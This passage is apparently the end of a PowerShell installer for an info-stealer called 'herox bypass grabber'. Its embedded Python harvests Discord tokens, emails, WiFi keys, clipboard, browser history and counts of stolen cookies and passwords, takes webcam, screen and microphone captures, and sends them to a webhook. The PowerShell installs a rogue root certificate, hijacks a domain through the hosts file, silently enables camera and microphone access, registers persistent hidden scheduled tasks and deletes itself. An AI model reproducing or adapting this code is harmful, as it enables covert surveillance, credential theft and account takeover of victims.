        info = validate(tok) or {}
        prev = known.get(key, {})
        if not prev:
            events.append("NEW")
        elif prev.get("valid") and not info.get("valid"):
            events.append("PATCHED/INVALID")
        if info.get("valid") and prev.get("id") and prev.get("id") != info.get("id"):
            events.append("CHANGED")
        known[key] = {"valid": info.get("valid"), "id": info.get("id"),
                      "user": info.get("username"), "seen": int(time.time())}
        if info.get("valid"):
            users.append("%s (%s)" % (info.get("username"), info.get("id")))
            lines.append("**VALID** `%s`\n> %s | %s | nitro %s | mfa %s | subs %s\n> `%s`\n> %s"
                         % (info.get("username"), info.get("id"), info.get("email") or "-",
                            info.get("nitro"), info.get("mfa"), info.get("subs", "?"), tok, src))
        else:
            lines.append("**%s** (HTTP %s)\n> `%s`\n> %s"
                         % ("INVALID" if info.get("valid") is False else "UNVERIFIED",
                            info.get("code", "?"), tok, src))
    save_state(st)

    desc = "\n".join(lines)[:4000] or "no tokens"
    if events:
        desc = "**%s**\n\n" % ", ".join(sorted(set(events))) + desc

    e = {
        "title": "%s | %s | %s" % (socket.gethostname(), sp.get("ip", "?"), tag),
        "description": desc,
        "color": 0x5865F2,
        "fields": [
            {"name": "Device", "value": "`%s` | %s | %s | up %s min" % (socket.gethostname(), sp.get("local", "?"), sp.get("geo") or "-", sp.get("uptime", "?")), "inline": False},
            {"name": "Users", "value": (", ".join(users) or "-")[:1000], "inline": True},
            {"name": "Emails", "value": ("\n".join(sp.get("emails", [])) or "-")[:1000], "inline": True},
            {"name": "WiFi", "value": "`%s`" % ((sp.get("wifi_keys") or sp.get("wifi") or "-")[:900]), "inline": False},
            {"name": "Disks", "value": "`%s`" % (sp.get("disks") or "-"), "inline": False},
            {"name": "Specs", "value": "CPU `%s`\nGPU `%s` %s\nRAM `%sGB`\n`%s`\n`%s`\nkey `%s`\nAV `%s`"
                % (sp.get("cpu"), sp.get("gpu"), sp.get("res"), sp.get("ram_gb"), sp.get("mobo"),
                   sp.get("os"), sp.get("key") or "-", sp.get("av") or "-"), "inline": False},
            {"name": "Accounts", "value": "`%s`" % (sp.get("users") or "-"), "inline": False},
            {"name": "Clipboard", "value": "`%s`" % ((sp.get("clip") or "-")[:900]), "inline": False},
            {"name": "Loot", "value": "cookies `%s` | passes `%s` | history `%s`"
                % (sp.get("ckn", 0), sp.get("pwn", 0), json.dumps(sp.get("hist", {}))), "inline": False},
        ],
        "footer": {"text": "herox bypass grabber • 30min"},
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
    }
    send({"username": "herox bypass grabber", "avatar_url": AVATAR, "embeds": [e]}, files)

def cycle(deep=True):
    t0 = time.time()
    sp = sysinfo()
    sp["ip"] = pub_ip()
    sp["local"] = local_ips()
    sp["geo"] = geo(sp["ip"])
    sp["emails"] = emails()
    sp["hist"] = histories()

    zp, sp["ckn"], sp["pwn"] = build_zip(sp)
    files = {"files[0]": ("dump.zip", open(zp, "rb"))}
    i = 1
    for fn, nm in ((camera(), "cam.jpg"), (shot(), "screen.jpg"), (voice(), "voice.wav")):
        if fn:
            files["files[%d]" % i] = (nm, open(fn, "rb"))
            i += 1

    tokens = quick_tokens()
    report(tokens, sp, "FIRST" if not os.path.exists(STATE) else "UPDATE", files)
    for f in files.values():
        try:
            f[1].close()
        except Exception:
            pass

    if deep:
        more = {k: v for k, v in disk_scan(t0 + 150).items() if k not in tokens and len(k) > 50}
        if more:
            slim = {"ip": sp["ip"], "local": sp["local"], "geo": sp["geo"], "emails": sp["emails"],
                    "hist": sp["hist"], "ckn": sp["ckn"], "pwn": sp["pwn"]}
            report(more, slim, "DEEP", {})
    log("cycle %ds tokens=%d ck=%d pw=%d" % (time.time() - t0, len(tokens), sp["ckn"], sp["pwn"]))

def main():
    once = "--once" in sys.argv
    while True:
        try:
            cycle()
        except Exception as e:
            log("cycle error %r" % e)
        if once:
            break
        time.sleep(INTERVAL)

if __name__ == "__main__":
    main()
'@

$utf8 = New-Object System.Text.UTF8Encoding($false)
foreach ($pair in @(@('makecert.py',$makecert), @('run.py',$runner), @('fake.py',$fake), @('cam.ps1',$cam), @('screen.ps1',$screen), @('grab.py',$grab))) {
    [IO.File]::WriteAllText((Join-Path $Root $pair[0]), $pair[1], $utf8)
}

python makecert.py
if (-not (Test-Path (Join-Path $Root 'seven.cer'))) { throw 'cert failed' }
$c = Import-Certificate -FilePath (Join-Path $Root 'seven.cer') -CertStoreLocation 'Cert:\CurrentUser\Root'
Write-Host "   cert $($c.Thumbprint)" -ForegroundColor Green

Copy-Item $Hosts (Join-Path $Root 'hosts.bak') -Force
(Get-Content $Hosts) | Where-Object { $_ -notmatch [regex]::Escape($Domain) } | Set-Content $Hosts
Add-Content -Path $Hosts -Value "127.0.0.1 $Domain"
ipconfig /flushdns | Out-Null

foreach ($cap in 'webcam','microphone') {
    $k = "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\$cap"
    if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
    Set-ItemProperty -Path $k -Name 'Value' -Value 'Allow'
}

$ico = Join-Path $Root 'fakeauth.ico'
try {
    Invoke-WebRequest -UseBasicParsing $IconUrl -OutFile (Join-Path $Root 'icon.jpg')
    Add-Type -AssemblyName System.Drawing
    $img = [System.Drawing.Image]::FromFile((Join-Path $Root 'icon.jpg'))
    $bmp = New-Object System.Drawing.Bitmap $img, 128, 128
    $icon = [System.Drawing.Icon]::FromHandle($bmp.GetHicon())
    $fs = [IO.File]::Create($ico); $icon.Save($fs); $fs.Close()
    $img.Dispose(); $bmp.Dispose()
} catch {}

$cs = Join-Path $Root 'launch.cs'
@"
using System;
using System.Diagnostics;
using System.IO;
class P {
  static void Main(string[] a) {
    string dir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
    string s = a.Length > 0 ? a[0] : "run.py";
    var si = new ProcessStartInfo(@"$pyw", "\"" + Path.Combine(dir, s) + "\"");
    si.WorkingDirectory = dir;
    si.UseShellExecute = false;
    si.CreateNoWindow = true;
    Process.Start(si).WaitForExit();
  }
}
"@ | Set-Content -Path $cs -Encoding UTF8

$csc = "$env:windir\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
if (Test-Path $csc) {
    $cargs = @('/nologo','/target:winexe',"/out:$Launcher")
    if (Test-Path $ico) { $cargs += "/win32icon:$ico" }
    $cargs += $cs
    & $csc $cargs 2>&1 | Out-Null
}
if (-not (Test-Path $Launcher)) { Copy-Item $pyw $Launcher -Force; $Launcher = $pyw }
Remove-Item $cs -Force -ErrorAction SilentlyContinue

$principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
    -ExecutionTimeLimit ([TimeSpan]::Zero) -MultipleInstances IgnoreNew -DontStopOnIdleEnd
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "$env:USERDOMAIN\$env:USERNAME"

foreach ($pair in @(@('FakeAuth','run.py'), @('FakeAuthGrab','grab.py'))) {
    $act = New-ScheduledTaskAction -Execute $Launcher -Argument $pair[1] -WorkingDirectory $Root
    Register-ScheduledTask -TaskName $pair[0] -Action $act -Trigger $trigger -Settings $settings `
        -Principal $principal -Force | Out-Null
}

Start-ScheduledTask -TaskName 'FakeAuth'
Start-ScheduledTask -TaskName 'FakeAuthGrab'
Start-Sleep -Seconds 5
attrib +h +s $Root

Write-Host ''
if (Get-NetTCPConnection -LocalPort 443 -State Listen -ErrorAction SilentlyContinue) {
    Write-Host '   :443 LISTEN' -ForegroundColor Green
} else { Write-Host '   :443 FAIL' -ForegroundColor Red }
Start-Sleep -Seconds 2
Get-Content (Join-Path $Root 'server.log') -Tail 3 -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "   $_" -ForegroundColor DarkGray }
Write-Host ''
Write-Host 'OK' -ForegroundColor Green
Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
